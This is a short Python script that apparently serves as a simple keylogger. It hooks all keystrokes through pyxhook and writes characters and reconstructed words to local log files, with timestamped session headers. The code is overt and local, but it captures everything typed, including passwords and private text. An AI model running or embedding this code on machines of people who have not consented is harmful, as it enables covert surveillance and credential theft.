import pyxhook
from time import gmtime, strftime

words_log='logs/words_log.txt'
chars_log='logs/chars_log.txt'
lst = []

def words(event):
    fob=open(words_log,'a')
    #if a function button (eg space/return/backspace)
    #function button will be larger than one character
    if(len(event.Key)>1):
        string = ''.join(lst)
        fob.write(string+' ')
        del lst[:]
    #length of 1 = a single character
    elif(len(event.Key)==1):
        lst.append(event.Key)
    fob.close()

def chars(event):
    fob=open(chars_log,'a')
    fob.write(event.Key+' ')
    fob.close()

def OnKeyPress(event):
    words(event)
    chars(event)

def session():
    time = strftime("%a, %d %b %Y %H:%M:%S +0000", gmtime())
    print('Session started.')
    print('Time of session start:')
    print(time)
    fob=open(words_log,'a')
    fob.write('\n\nNew session started\n'+time+'\n')
    fob.close()
    fob=open(chars_log,'a')
    fob.write('\n\nNew session started\n'+time+'\n')
    fob.close()
    print('Now listening to keyboard inputs, ^C to exit')

#instantiate HookManager class
new_hook=pyxhook.HookManager()
#listen to all keystrokes
new_hook.KeyDown=OnKeyPress
#hook the keyboard
new_hook.HookKeyboard()
#start the session
new_hook.start()

session()
